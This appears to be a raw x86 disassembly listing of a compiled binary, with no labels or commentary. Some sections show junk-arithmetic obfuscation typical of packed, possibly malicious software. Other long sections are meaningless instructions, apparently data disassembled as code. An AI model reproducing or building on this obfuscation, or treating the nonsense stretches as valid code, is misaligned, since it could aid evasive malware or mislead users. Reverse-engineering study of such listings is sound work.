  4166d4:	mov    cl,BYTE PTR [esi-0x1b]
  4166d7:	push   ss
  4166d8:	into   
  4166d9:	imul   eax,DWORD PTR [ebx+0x7e],0xffffff97
  4166dd:	es or  al,0x99
  4166e0:	retf   
  4166e1:	cmp    dl,dl
  4166e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166e4:	jo     0x41674b
  4166e6:	or     cl,dh
  4166e8:	test   al,0x46
  4166ea:	mov    ds:0x16f89f36,al
  4166ef:	aaa    
  4166f0:	push   ebx
  4166f1:	or     BYTE PTR [esi],ch
  4166f3:	and    DWORD PTR [eax],ecx
  4166f5:	xlat   BYTE PTR ds:[ebx]
  4166f6:	sti    
  4166f7:	jecxz  0x4166fb
  4166f9:	in     eax,dx
  4166fa:	lea    edi,[edx]
  4166fc:	push   ebx
  4166fd:	add    ecx,DWORD PTR [esi+0x52d2d8ec]
  416703:	mov    cl,0x13
  416705:	sub    ah,BYTE PTR [ecx+0x46]
  416708:	and    DWORD PTR [ecx-0x2a],edi
  41670b:	hlt    
  41670c:	cli    
  41670d:	adc    al,0x8e
  41670f:	int3   
  416710:	jnp    0x41670d
  416712:	or     edx,DWORD PTR [ebp-0x7f]
  416715:	jne    0x41674b
  416717:	xchg   ecx,eax
  416718:	call   0xd34d:0x5c721dbe
  41671f:	fdivr  DWORD PTR [ecx]
  416721:	xchg   ebx,eax
  416722:	ss mov dl,0x2d
  416725:	js     0x416745
  416727:	cmp    eax,0x5a33698b
  41672c:	xor    eax,0x3d463bc4
  416731:	add    BYTE PTR [ebp+0x41],ah
  416734:	js     0x416733
  416736:	or     eax,0xe02cc3e9
  41673b:	jo     0x416782
  41673d:	inc    ebx
  41673e:	xor    esi,ecx
  416740:	bound  esi,QWORD PTR [ebx-0x6e]
  416743:	pop    ds
  416744:	(bad)  
  416745:	mov    ah,0x6e
  416747:	pop    esi
  416748:	(bad)  
  416749:	into   
  41674a:	sbb    ebp,DWORD PTR [ecx]
  41674c:	xor    al,0xbf
  41674e:	xor    eax,0x9eb2eb66
  416753:	nop
  416754:	repz cld 
  416756:	loope  0x416783
  416758:	in     eax,dx
  416759:	dec    ebx
  41675a:	cmp    al,0xe1
  41675c:	sub    esp,DWORD PTR [edx+0x6c]
  41675f:	sub    BYTE PTR [edi+0x76],bl
  416762:	inc    edx
  416763:	add    edi,DWORD PTR [ecx]
  416765:	cld    
  416766:	(bad)  [eax]
  416768:	push   ecx
  416769:	dec    eax
  41676a:	scas   al,BYTE PTR es:[edi]
  41676b:	daa    
  41676c:	dec    ecx
  41676d:	sar    edi,1
  41676f:	mov    esi,DWORD PTR [ebx-0x739689f8]
  416775:	call   0x1458d6c3
  41677a:	pushf  
  41677b:	xchg   ebp,eax
  41677c:	mov    BYTE PTR [edx+ebx*1],al
  41677f:	mov    eax,DWORD PTR [ebp-0x38]
  416782:	add    eax,DWORD PTR [ebp-0x3c]
  416785:	mov    edx,DWORD PTR [ebp-0x40]
  416788:	xor    eax,edx
  41678a:	mov    edx,DWORD PTR [ebp-0x44]
  41678d:	xor    eax,edx
  41678f:	mov    edx,0x61f7
  416794:	sub    edx,eax
  416796:	mov    eax,DWORD PTR [ebp-0x4]
  416799:	add    edi,edx
  41679b:	mov    edx,DWORD PTR [ebp-0x8]
  41679e:	sub    eax,0x7721
  4167a3:	xor    eax,edx
  4167a5:	mov    edx,DWORD PTR [ebp-0xc]
  4167a8:	xor    eax,edx
  4167aa:	or     eax,0x7bc9
  4167af:	xor    eax,0xfffff0db
  4167b4:	mov    DWORD PTR [ebp-0x2c],edi
  4167b7:	sub    edi,eax
  4167b9:	mov    eax,DWORD PTR [ebp-0x10]
  4167bc:	mov    edx,DWORD PTR [ebp-0x14]
  4167bf:	mov    ebx,DWORD PTR [ebp-0x18]
  4167c2:	xor    eax,edx
  4167c4:	xor    edx,edx
  4167c6:	sub    eax,esi
  4167c8:	div    ebx
  4167ca:	pop    edx
  4167cb:	xor    eax,ecx
  4167cd:	sub    edx,eax
  4167cf:	cmp    edi,edx
  4167d1:	jbe    0x415f06
  4167d7:	pop    edi
  4167d8:	pop    esi
  4167d9:	pop    ebx
  4167da:	leave  
  4167db:	ret    0x8
  4167de:	push   ebp
  4167df:	mov    ebp,esp
  4167e1:	and    esp,0xfffffff8
  4167e4:	sub    esp,0x9c
  4167ea:	push   ebx
  4167eb:	push   esi
  4167ec:	push   edi
  4167ed:	push   DWORD PTR ds:0x422574
  4167f3:	lea    eax,[esp+0xa4]
  4167fa:	push   eax
  4167fb:	call   DWORD PTR ds:0x42dfe0
  416801:	push   DWORD PTR [esp+0xa4]
  416808:	push   DWORD PTR ds:0x422560
  41680e:	call   DWORD PTR ds:0x42e250
  416814:	push   eax
  416815:	call   DWORD PTR ds:0x42e2b0
  41681b:	cmp    DWORD PTR ds:0x428555,0x0
  416822:	mov    ecx,0x19be
  416827:	mov    ecx,0x6729
  41682c:	not    ecx
  41682e:	mov    DWORD PTR ds:0x428569,0x315f
  416838:	jmp    0x416882
  41683d:	mov    DWORD PTR ds:0x4284d5,0x96c
  416847:	cmp    DWORD PTR ds:0x428555,0x0
  41684e:	jbe    0x416866
  416854:	push   0x428147
  416859:	call   DWORD PTR ds:0x42e268
  41685f:	inc    ecx
  416860:	adc    ecx,DWORD PTR ds:0x428565
  416866:	and    DWORD PTR ds:0x4284c9,0x5e58
  416870:	mov    ecx,DWORD PTR ds:0x428429
  416876:	sub    ecx,DWORD PTR ds:0x428501
  41687c:	mov    DWORD PTR ds:0x428429,ecx
  416882:	mov    ecx,DWORD PTR ds:0x422928
  416888:	and    DWORD PTR ds:0x428375,0x41d
  416892:	push   0x0
  416894:	and    DWORD PTR ds:0x428565,0x4284d9
  41689e:	push   DWORD PTR [ecx]
  4168a0:	and    DWORD PTR ds:0x42845d,0x7a21
  4168aa:	call   eax
  4168ac:	mov    esi,0x1ff
  4168b1:	xor    DWORD PTR ds:0x428349,ebx
  4168b7:	mov    DWORD PTR [esp+0x24],0x3992
  4168bf:	mov    DWORD PTR [esp+0xc],0x79a2
  4168c7:	cmp    DWORD PTR ds:0x42841d,0x0
  4168ce:	mov    ecx,0x6401
  4168d3:	mov    DWORD PTR ds:0x428355,0x3a8d
  4168dd:	mov    DWORD PTR ds:0x42845d,0x1a46
  4168e7:	mov    DWORD PTR ds:0x42847d,edx
  4168ed:	jmp    0x416927
  4168f2:	movzx  eax,BYTE PTR ds:0x42841d
  4168f9:	movzx  eax,WORD PTR ds:0x428479
  416900:	cmp    DWORD PTR ds:0x42841d,0x0
  416907:	jge    0x41691f
  41690d:	push   DWORD PTR [ebp-0xc]
  416910:	push   0x3a70
  416915:	call   DWORD PTR ds:0x42e0e4
  41691b:	not    ecx
  41691d:	adc    ecx,ecx
  41691f:	xor    ecx,DWORD PTR ds:0x428579
  416925:	or     ecx,ecx
  416927:	mov    eax,DWORD PTR [esp+0xc]
  41692b:	mov    ecx,DWORD PTR [esp+0x24]
  41692f:	or     DWORD PTR ds:0x428335,0x42841d
  416939:	xor    eax,0x1d22
  41693e:	and    DWORD PTR ds:0x428365,0x1749
  416948:	imul   eax,eax,0xffffdeb4
  41694e:	or     DWORD PTR ds:0x42854d,0x428569
  416958:	and    eax,0x43eb
  41695d:	sub    eax,ecx
  41695f:	or     DWORD PTR ds:0x428411,ebx
  416965:	mov    DWORD PTR [esp+0x3c],eax
  416969:	dec    eax
  41696a:	mov    DWORD PTR [esp+0x38],0x3b18
  416972:	mov    DWORD PTR [esp+0x2c],0x6c93
  41697a:	or     eax,DWORD PTR ds:0x428475
  416980:	mov    DWORD PTR [esp+0x24],0x418e
  416988:	xor    ecx,ecx
  41698a:	mov    DWORD PTR [esp+0xc],0x5ac3
  416992:	mov    eax,DWORD PTR [esp+0xc]
  416996:	sub    ecx,DWORD PTR ds:0x42845d
  41699c:	mov    ecx,DWORD PTR [esp+0x24]
  4169a0:	sub    ecx,eax
  4169a2:	xor    eax,0x684c
  4169a7:	mov    eax,DWORD PTR [esp+0x2c]
  4169ab:	or     DWORD PTR ds:0x428561,0x4866
  4169b5:	and    ecx,eax
  4169b7:	or     DWORD PTR ds:0x42840d,0x3518
  4169c1:	mov    eax,DWORD PTR [esp+0x38]
  4169c5:	xor    ecx,0x10d6
  4169cb:	sub    ecx,0x782c
  4169d1:	add    DWORD PTR ds:0x428445,0x3d80
  4169db:	imul   ecx,eax
  4169de:	mov    eax,DWORD PTR [esp+0x3c]
  4169e2:	mov    DWORD PTR ds:0x42835d,0x7bdf
  4169ec:	cmp    eax,ecx
  4169ee:	mov    DWORD PTR ds:0x42832d,0x6991
  4169f8:	jne    0x41701a
  4169fe:	mov    DWORD PTR [esp+0x10],0x1
  416a06:	sbb    eax,DWORD PTR ds:0x428351
  416a0c:	mov    DWORD PTR [esp+0x30],0x2f16
  416a14:	mov    DWORD PTR [esp+0x48],0x16f
  416a1c:	jmp    0x416c79
  416a21:	and    DWORD PTR [esp+ebp*1+0x3bb6ac2e],eax
  416a28:	xchg   esp,eax
  416a29:	jmp    0x4169d2
  416a2b:	int    0x90
  416a2d:	adc    bl,BYTE PTR [edx-0x2bf31c68]
  416a33:	sar    BYTE PTR [esi-0x41413dcb],0xc6
  416a3a:	pop    es
  416a3b:	and    BYTE PTR [edx-0x66714cae],dl
  416a41:	sub    al,0xec
  416a43:	loop   0x416a67
  416a45:	repnz cmp bl,BYTE PTR ds:0xe144eb32
  416a4d:	mov    ss,WORD PTR [esi+0x25]
  416a50:	loopne 0x416a3f
  416a52:	ret    
  416a53:	addr16 cmp al,0xb3
  416a56:	dec    BYTE PTR [ebp+0x82317e3]
  416a5c:	bound  ebx,QWORD PTR [edi-0x28]
  416a5f:	retf   
  416a60:	xchg   esi,eax
  416a61:	scas   al,BYTE PTR es:[edi]
  416a62:	jne    0x4169f2
  416a64:	jne    0x416a6b
  416a66:	lea    esi,[esi+0xe204e2a]
  416a6c:	in     al,dx
  416a6d:	loope  0x416a84
  416a6f:	test   BYTE PTR [eax+0x62],bh
  416a72:	int    0x59
  416a74:	jns    0x416a93
  416a76:	popf   
  416a77:	pop    esp
  416a78:	(bad)  
  416a79:	lods   eax,DWORD PTR ds:[esi]
  416a7a:	xchg   BYTE PTR [ecx-0x5855edd7],dh
  416a80:	mov    edx,0x71a1be53
  416a85:	aad    0xba
  416a87:	inc    edi
  416a88:	das    
  416a89:	and    dl,BYTE PTR cs:[eax+ecx*1+0x7c]
  416a8e:	ret    
  416a8f:	loope  0x416b02
  416a91:	inc    esp
  416a92:	jns    0x416a5c
  416a94:	push   ebp
  416a95:	jecxz  0x416adb
  416a97:	sbb    eax,0xc54f33c4
  416a9c:	dec    edi
  416a9d:	mov    al,0x5c
  416a9f:	(bad)  
  416aa1:	in     al,0x15
  416aa3:	std    
  416aa4:	cmp    esi,DWORD PTR [edx-0x37]
  416aa7:	adc    DWORD PTR [eax+0x2c],edx
  416aaa:	xor    ecx,DWORD PTR [esi]
  416aac:	sahf   
  416aad:	ror    BYTE PTR [ebx],cl
  416aaf:	sahf   
  416ab0:	inc    edx
  416ab1:	fcomp  DWORD PTR [edi]
  416ab3:	adc    dh,BYTE PTR [esi]
  416ab5:	and    DWORD PTR [ebp-0x72],esi
  416ab8:	sbb    ebp,esi
  416aba:	pop    ebp
  416abb:	jno    0x416a99
  416abd:	repz and BYTE PTR [edx-0x6c],dh
  416ac1:	fsubr  QWORD PTR [edi+edi*2]
  416ac4:	fisttp QWORD PTR [ebx]
  416ac6:	fwait
  416ac7:	das    
  416ac8:	rcr    BYTE PTR [eax-0xa],1
  416acb:	adc    al,0x91
  416acd:	jl     0x416aa2
  416acf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ad0:	sub    DWORD PTR cs:[ebx-0x67],eax
  416ad4:	and    BYTE PTR [ebx-0x7742bf4d],dh
  416ada:	adc    al,0x77
  416adc:	cmp    ebp,DWORD PTR [esp+ecx*4-0x56]
  416ae0:	inc    esp
  416ae1:	sub    eax,0x727ec930
  416ae6:	jecxz  0x416ae1
  416ae8:	push   ebp
  416ae9:	dec    eax
  416aea:	ja     0x416ac7
  416aec:	push   edx
  416aed:	lea    edx,[esi]
  416aef:	ror    DWORD PTR [eax],cl
  416af1:	inc    edi
  416af2:	jecxz  0x416af0
  416af4:	mov    eax,ds:0x5100277
  416af9:	fdiv   QWORD PTR [edx-0x58]
  416afc:	les    ebx,FWORD PTR [edi+ebx*8-0x37]
  416b00:	outs   dx,BYTE PTR ds:[esi]
  416b01:	loopne 0x416b5c
  416b03:	xor    bh,dh
  416b05:	or     BYTE PTR [ebx+eiz*4+0x7b46167b],ch
  416b0c:	dec    ecx
  416b0d:	out    dx,eax
  416b0e:	sub    al,0x92
  416b10:	sbb    esi,esi
  416b12:	dec    ebx
  416b13:	push   es
  416b14:	jge    0x416b05
  416b16:	leave  
  416b17:	call   0x37758584
  416b1c:	push   cs
  416b1d:	ins    DWORD PTR es:[edi],dx
  416b1e:	pusha  
  416b1f:	pop    eax
  416b20:	dec    ecx
  416b21:	sbb    DWORD PTR [ebp-0x459e273],0xffffff88
  416b28:	and    al,0xd5
  416b2a:	(bad)  
  416b2b:	fild   QWORD PTR [edi-0x2362e47]
  416b31:	pop    ecx
  416b32:	sbb    al,0x5
  416b34:	jmp    0x868ba1c7
  416b39:	ds cli 
  416b3b:	or     al,0xf9
  416b3d:	and    esi,DWORD PTR [eax-0x204250dd]
  416b43:	jnp    0x416b02
  416b45:	xor    DWORD PTR [ecx-0x54803100],eax
  416b4b:	jmp    0x79949f29
  416b50:	inc    edi
  416b51:	rcr    DWORD PTR [ebp-0x7de5db54],0xe1
  416b58:	sub    al,BYTE PTR [edi+0x5d]
  416b5b:	adc    BYTE PTR [ebx+0x34],bl
  416b5e:	push   ebp
  416b5f:	push   ecx
  416b60:	or     bl,BYTE PTR [esi]
  416b62:	addr16 imul eax,ebx,0xffffff94
  416b66:	sbb    eax,0x8d9445b1
  416b6b:	mov    ebx,0x7ab893e7
  416b70:	sbb    bl,al
  416b72:	xor    eax,0x5e27a63a
  416b77:	or     al,0x5f
  416b79:	cli    
  416b7a:	pop    edx
  416b7b:	mov    esi,0xfa757425
  416b80:	lods   eax,DWORD PTR ds:[esi]
  416b81:	push   edx
  416b82:	(bad)  
  416b83:	jg     0x416bf9
  416b85:	je     0x416bbe
  416b87:	cmp    dh,ch
  416b89:	mov    esi,ecx
  416b8b:	std    
  416b8c:	pop    eax
  416b8d:	adc    DWORD PTR [ebx-0x76ff4393],eax
  416b93:	pop    eax
  416b94:	sar    DWORD PTR ds:0x7c3146aa,1
  416b9a:	frstor [ebx+eax*2]
  416b9d:	jne    0x416b33
  416b9f:	(bad)  
  416ba2:	in     al,0x82
  416ba4:	pusha  
  416ba5:	mov    DWORD PTR [ecx-0x27],eax
  416ba8:	loope  0x416b90
  416baa:	and    ebp,DWORD PTR [edx-0x15624e6c]
  416bb0:	inc    edi
  416bb1:	push   eax
  416bb2:	ret    
  416bb3:	cmp    al,0x6f
  416bb5:	mov    ds:0xfafa526d,eax
  416bba:	or     eax,0x5aa50a19
  416bbf:	xchg   edx,eax
  416bc0:	out    0xb6,eax
  416bc2:	shr    DWORD PTR [esi],cl
  416bc4:	fs sub DWORD PTR ds:[edx+0xa],ebp
  416bc9:	inc    ecx
  416bca:	repnz push ebx
  416bcc:	mov    esp,0x85e93638
  416bd1:	mov    al,cl
  416bd3:	stos   BYTE PTR es:[edi],al
  416bd4:	dec    esi
  416bd5:	cmp    ch,cl
  416bd7:	fldcw  WORD PTR ss:[ebp-0x44]
  416bdb:	xchg   ebx,eax
  416bdc:	mov    al,ds:0x95947f5c
  416be1:	iret   
  416be2:	cmp    eax,0xea73b835
  416be7:	int3   
  416be8:	cld    
  416be9:	inc    edi
  416bea:	mov    bl,0x6f
  416bec:	imul   edi,DWORD PTR [eax-0x4a],0xfffffff1
  416bf0:	jae    0x416bd2
  416bf2:	lahf   
  416bf3:	lds    ecx,FWORD PTR [ecx-0x70]
  416bf6:	xchg   esp,eax
  416bf7:	jnp    0x416c61
  416bf9:	(bad)  
  416bfb:	and    eax,0x31b94620
  416c00:	mov    bl,0x73
  416c02:	jmp    0x4f4:0xb5cf8b51
  416c09:	test   al,0xc
  416c0b:	sub    DWORD PTR [edx+0x42],0xffffffdb
  416c0f:	(bad)  
  416c11:	(bad)  
  416c12:	xchg   esp,eax
  416c13:	cvtps2pd xmm3,xmm1
  416c16:	or     eax,0x5efe516c
  416c1b:	rcl    DWORD PTR [edi],0x4e
  416c1e:	in     eax,dx
  416c1f:	xchg   BYTE PTR [edx],al
  416c21:	xor    dl,BYTE PTR [ebx-0xb]
  416c24:	inc    edx
  416c25:	neg    DWORD PTR [esi]
  416c27:	sbb    BYTE PTR ds:0xfcd29368,dl
  416c2d:	pause  
  416c2f:	and    eax,0x9c4636ae
  416c34:	jnp    0x416c5d
  416c36:	jmp    0xffd3e6ca
  416c3b:	mov    BYTE PTR [esi-0x3a],ch
  416c3e:	mov    al,0xc6
  416c40:	dec    esi
  416c41:	jle    0x416c2d
  416c43:	aaa    
  416c44:	sti    
  416c45:	test   DWORD PTR cs:[ebx+0x16a10751],eax
  416c4c:	adc    BYTE PTR [edi+0x71],dh
  416c4f:	int    0x3c
  416c51:	scas   eax,DWORD PTR es:[edi]
  416c52:	jmp    0x96480ff2
  416c57:	jle    0x416c75
  416c59:	jb     0x416ccf
  416c5b:	inc    esi
  416c5c:	xor    DWORD PTR [ecx],esi
  416c5e:	leave  
  416c5f:	test   bl,cl
  416c61:	jne    0x416cdb
  416c63:	cmp    BYTE PTR [ecx-0xa6f9bd1],bh
  416c69:	je     0x416c27
  416c6b:	pop    ecx
  416c6c:	xor    al,0x44
  416c6e:	sub    al,0x4e
  416c70:	lahf   
  416c71:	das    
  416c72:	out    dx,eax
  416c73:	ror    DWORD PTR [ecx+0x3096a1a3],0xc7
  416c7a:	inc    esp
  416c7b:	and    al,0x50
  416c7d:	lds    esi,FWORD PTR [eax]
  416c7f:	add    BYTE PTR [eax],al
  416c81:	or     ecx,ecx
  416c83:	push   DWORD PTR ds:0xe5bfd6f1
  416c89:	not    eax
  416c8b:	mov    DWORD PTR [esp+0x8c],0x4ebc
  416c96:	mov    DWORD PTR [esp+0x98],0x76
  416ca1:	adc    ecx,DWORD PTR ds:0x428431
  416ca7:	mov    DWORD PTR [esp+0x40],0x556d
  416caf:	mov    DWORD PTR [esp+0x3c],0x63d5
  416cb7:	dec    eax
  416cb8:	mov    DWORD PTR [esp+0x30],0x169
  416cc0:	inc    ecx
  416cc1:	mov    DWORD PTR [esp+0x28],0x101b
  416cc9:	mov    DWORD PTR [esp+0x10],0x6bec
  416cd1:	mov    eax,DWORD PTR [esp+0x10]
  416cd5:	mov    ecx,DWORD PTR [esp+0x28]
  416cd9:	sbb    DWORD PTR ds:0x428439,0x35b0
  416ce3:	imul   eax,ecx
  416ce6:	sub    DWORD PTR ds:0x4284f1,edx
  416cec:	or     eax,0x7f7d
  416cf1:	xor    eax,0xcf336131
  416cf6:	mov    DWORD PTR ds:0x4284d5,0x5640
  416d00:	push   DWORD PTR [eax]
  416d02:	cmp    DWORD PTR ds:0x428359,0x0
  416d09:	mov    DWORD PTR ds:0x428341,edi
  416d0f:	mov    DWORD PTR ds:0x428445,0x594e
  416d19:	mov    ecx,0x35fb
  416d1e:	mov    DWORD PTR ds:0x4284fd,0x3932
  416d28:	jmp    0x416e08
  416d2d:	mov    DWORD PTR ds:0x428419,0xa9d
  416d37:	cmp    DWORD PTR ds:0x428359,0x0
  416d3e:	jg     0x416d5d
  416d44:	push   0x46ad
  416d49:	call   DWORD PTR ds:0x42e26c
  416d4f:	and    DWORD PTR ds:0x428561,0x42836d
  416d59:	adc    ecx,ecx
  416d5b:	xor    ecx,ecx
  416d5d:	and    ecx,0x3418
  416d63:	and    ecx,0x2934
  416d69:	or     ecx,ecx
  416d6b:	movzx  ecx,BYTE PTR ds:0x428365
  416d72:	adc    DWORD PTR ds:0x428439,ecx
  416d78:	cmp    DWORD PTR ds:0x428555,0x0
  416d7f:	mov    DWORD PTR ds:0x428579,edi
  416d85:	mov    DWORD PTR ds:0x428579,ebx
  416d8b:	mov    DWORD PTR ds:0x42840d,0x662b
  416d95:	mov    DWORD PTR ds:0x428561,0x653a
  416d9f:	jmp    0x416e08
  416da4:	mov    DWORD PTR ds:0x428355,ebx
  416daa:	cmp    DWORD PTR ds:0x428555,0x0
  416db1:	jg     0x416ded
  416db7:	push   0x2fcf
  416dbc:	push   0x4281db
  416dc1:	call   DWORD PTR ds:0x42e270
  416dc7:	mov    ecx,DWORD PTR ds:0x428531
  416dcd:	mov    ecx,DWORD PTR [ecx]
  416dcf:	adc    DWORD PTR ds:0x42856d,ecx
  416dd5:	sbb    ecx,0x197c
  416ddb:	mov    ecx,DWORD PTR ds:0x428551
  416de1:	and    DWORD PTR ds:0x428461,ecx
  416de7:	sub    ecx,0x1b1e
  416ded:	sub    ecx,DWORD PTR ds:0x428359
  416df3:	add    DWORD PTR ds:0x42833d,0x6bb0
  416dfd:	add    DWORD PTR ds:0x428369,edi
  416e03:	adc    eax,0x3de3
  416e08:	mov    eax,DWORD PTR [esp+0x34]
  416e0c:	add    eax,0x75d9
  416e11:	push   0xd
  416e13:	add    DWORD PTR ds:0x428481,ebx
  416e19:	pop    ecx
  416e1a:	xor    edx,edx
  416e1c:	div    ecx
  416e1e:	mov    ecx,DWORD PTR [esp+0x40]
  416e22:	xor    edx,edx
  416e24:	or     eax,ecx
  416e26:	sbb    DWORD PTR ds:0x428351,edi
  416e2c:	mov    ecx,DWORD PTR [esp+0x44]
  416e30:	inc    DWORD PTR ds:0x428431
  416e36:	or     eax,ecx
  416e38:	or     ecx,0x12fe
  416e3e:	mov    ecx,DWORD PTR [esp+0x9c]
  416e45:	div    ecx
  416e47:	xor    edx,edx
  416e49:	cmp    DWORD PTR ds:0x42854d,0x0
  416e50:	movzx  ecx,WORD PTR ds:0x428545
  416e57:	mov    ecx,DWORD PTR ds:0x428481
  416e5d:	jmp    0x416ec3
  416e62:	mov    DWORD PTR ds:0x428451,0x6ae9
  416e6c:	cmp    DWORD PTR ds:0x42854d,0x0
  416e73:	jg     0x416ea3
  416e79:	push   0x1
  416e7b:	call   DWORD PTR ds:0x42e0e8
  416e81:	xor    DWORD PTR ds:0x428411,edi
  416e87:	and    DWORD PTR ds:0x428371,0x7db2
  416e91:	mov    ecx,DWORD PTR ds:0x428441
  416e97:	or     DWORD PTR ds:0x428575,ecx
  416e9d:	add    DWORD PTR ds:0x4284e1,ebx
  416ea3:	or     DWORD PTR ds:0x4284d1,0xb88
  416ead:	adc    ecx,DWORD PTR ds:0x428365
  416eb3:	sub    DWORD PTR ds:0x4284c9,0x13f0
  416ebd:	sbb    DWORD PTR ds:0x428375,edx
  416ec3:	xor    eax,0x680da048
  416ec8:	cmp    DWORD PTR ds:0x42840d,0x0
  416ecf:	mov    DWORD PTR ds:0x428331,0x5921
  416ed9:	mov    DWORD PTR ds:0x4284e1,edi
  416edf:	jmp    0x416f57
  416ee4:	mov    ecx,0x423c
  416ee9:	cmp    DWORD PTR ds:0x42840d,0x0
  416ef0:	jne    0x416f33
  416ef6:	push   0x145c
  416efb:	push   0x428351
  416f00:	call   DWORD PTR ds:0x42e274
  416f06:	adc    DWORD PTR ds:0x4284d1,0x2a49
  416f10:	and    DWORD PTR ds:0x428561,0x95c
  416f1a:	movzx  ecx,BYTE PTR ds:0x42845d
  416f21:	adc    DWORD PTR ds:0x428475,ecx
  416f27:	mov    ecx,DWORD PTR ds:0x428545
  416f2d:	adc    DWORD PTR ds:0x428421,ecx
  416f33:	or     DWORD PTR ds:0x428361,0x75b4
  416f3d:	adc    DWORD PTR ds:0x4284c5,edx
  416f43:	or     DWORD PTR ds:0x4284fd,0x469c
  416f4d:	or     DWORD PTR ds:0x428459,0x5212
  416f57:	push   DWORD PTR [eax]
  416f59:	adc    DWORD PTR ds:0x428461,0x3264
  416f63:	mov    eax,DWORD PTR [esp+0x94]
  416f6a:	mov    ecx,DWORD PTR ds:0x428421
  416f70:	or     ecx,DWORD PTR ds:0x428501
  416f76:	mov    DWORD PTR ds:0x428421,ecx
  416f7c:	mov    ecx,DWORD PTR [esp+0x5c]
  416f80:	push   DWORD PTR ds:0x4facd31
  416f86:	sbb    DWORD PTR ds:0x428555,0x428551
  416f90:	add    eax,0xb4a
  416f95:	push   DWORD PTR ds:0x1e6ebff7
  416f9b:	imul   eax,ecx
  416f9e:	push   DWORD PTR [eax-0x3f17647c]
  416fa4:	add    DWORD PTR ds:0x428375,0x6df5
  416fae:	mov    eax,DWORD PTR [esp+0x60]
  416fb2:	mov    ecx,DWORD PTR [esp+0x48]
  416fb6:	sub    DWORD PTR ds:0x428405,0x428445
  416fc0:	xor    eax,ecx
  416fc2:	sub    DWORD PTR ds:0x428551,0x5fb7
  416fcc:	mov    ecx,DWORD PTR [esp+0x28]
  416fd0:	or     DWORD PTR ds:0x428349,0x42832d
  416fda:	div    ecx
  416fdc:	sbb    DWORD PTR ds:0x42832d,0x428365
  416fe6:	and    eax,0x100
  416feb:	xor    DWORD PTR ds:0x428459,0x79f1
  416ff5:	or     eax,0x290
  416ffa:	add    DWORD PTR ds:0x42836d,0x42832d
  417004:	push   DWORD PTR [eax-0x494a7887]
  41700a:	xor    DWORD PTR ds:0x428425,0x4284f5
  417014:	call   DWORD PTR ds:0x42e124
  41701a:	or     DWORD PTR ds:0x4284d1,0x74bf
  417024:	dec    esi
  417025:	mov    DWORD PTR ds:0x428451,0x5180
  41702f:	jne    0x4168b1
  417035:	mov    DWORD PTR [esp+0x18],0xcb79b576
  41703d:	cmp    DWORD PTR ds:0x4284d5,0x0
  417044:	not    DWORD PTR ds:0x428419
  41704a:	mov    DWORD PTR ds:0x4284dd,0x4717
  417054:	jmp    0x4170cc
  417059:	movzx  esi,BYTE PTR ds:0x42835d
  417060:	cmp    DWORD PTR ds:0x4284d5,0x0
  417067:	jae    0x41709b
  41706d:	push   0x4281b5
  417072:	push   0x6423
  417077:	push   DWORD PTR [ebp-0xc]
  41707a:	push   DWORD PTR [ebp-0x1c]
  41707d:	push   DWORD PTR [ebp-0x28]
  417080:	push   0x1c3a
  417085:	call   DWORD PTR ds:0x42e278
  41708b:	or     DWORD PTR ds:0x428339,edi
  417091:	xor    DWORD PTR ds:0x428459,0x58f
  41709b:	sbb    DWORD PTR ds:0x42846d,ecx
  4170a1:	sub    DWORD PTR ds:0x428561,0x607b
  4170ab:	mov    esi,DWORD PTR ds:0x4283dd
  4170b1:	mov    esi,DWORD PTR [esi]
  4170b3:	or     DWORD PTR ds:0x428581,esi
  4170b9:	movzx  esi,BYTE PTR ds:0x428461
  4170c0:	add    esi,DWORD PTR ds:0x428501
  4170c6:	mov    DWORD PTR ds:0x428461,esi
  4170cc:	mov    esi,0x9c2b8ae8
  4170d1:	sub    DWORD PTR ds:0x42836d,0x428441
  4170db:	mov    DWORD PTR [esp+0x1c],esi
  4170df:	mov    DWORD PTR [esp+0x70],0xcb79b572
  4170e7:	mov    DWORD PTR [esp+0x74],esi
  4170eb:	call   0x408bfd
  4170f0:	sbb    edi,edx
  4170f2:	jmp    0x41734f
  4170f7:	add    edi,DWORD PTR [esi]
  4170f9:	popf   
  4170fa:	jmp    0x4170a0
  4170fc:	sub    al,0x8c
  4170fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170ff:	scas   eax,DWORD PTR es:[di]
  417101:	xchg   esi,eax
  417102:	jecxz  0x417179
  417104:	mov    esi,0xd884dd04
  417109:	sar    BYTE PTR [esi-0x41413dcb],0x76
  417110:	cli    
  417111:	ror    DWORD PTR [esi+ebp*1-0x18e2c9a7],1
  417118:	into   
  417119:	not    DWORD PTR [ebp+0x7a]
  41711c:	aam    0x43
  41711e:	dec    edx
  41711f:	xchg   edx,eax
  417120:	lds    ecx,FWORD PTR [ecx-0x3525396d]
  417126:	push   ebp
  417127:	shl    ch,0xd9
  41712a:	inc    ebp
  41712b:	cmc    
  41712c:	add    al,0x6d
  41712e:	xchg   ebp,eax
  41712f:	and    DWORD PTR [esi],esi
  417131:	add    BYTE PTR [eax+0x508edc34],dl
  417137:	and    BYTE PTR [edi+0x2e],ah
  41713a:	push   esp
  41713b:	cmp    BYTE PTR [ebp+0x7e59fbe6],al
  417141:	jo     0x417141
  417143:	pop    ds
  417144:	jae    0x4170de
  417146:	clc    
  417147:	addr16 xor dl,dh
  41714a:	in     eax,0x58
  41714c:	cmp    BYTE PTR [ebx+ebp*4+0x394f2f58],ah
  417153:	push   ss
  417154:	xor    DWORD PTR [ecx+0x2b],edx
  417157:	xor    esi,esp
  417159:	push   esi
  41715a:	mov    cl,0xb9
  41715c:	int3   
  41715d:	jmp    0x4171c1
  41715f:	xor    al,0x94
  417161:	add    BYTE PTR [ebx],cl
  417163:	sbb    BYTE PTR [edi+0x5e],0xd1
  417167:	sbb    al,0x1b
  417169:	(bad)  
  41716a:	int    0x53
  41716c:	and    esi,ecx
  41716e:	xchg   edx,eax
  41716f:	clc    
  417170:	bound  ebx,QWORD PTR [edx-0x1d22801f]
  417176:	outs   dx,DWORD PTR ds:[esi]
  417177:	in     eax,dx
  417178:	adc    eax,0x29d38f9d
  41717d:	jns    0x417107
  41717f:	fcmovu st,st(5)
  417181:	mov    esi,0x926341ef
  417186:	dec    edi
  417187:	push   edi
  417188:	cmp    al,0xed
  41718a:	pop    ebp
  41718b:	cmc    
  41718c:	lea    esp,[ecx-0x7b]
  41718f:	les    ecx,FWORD PTR [edi+edi*8+0x6f]
  417193:	jge    0x41711b
  417195:	xor    al,0x1e
  417197:	mov    WORD PTR [esi-0x67],gs
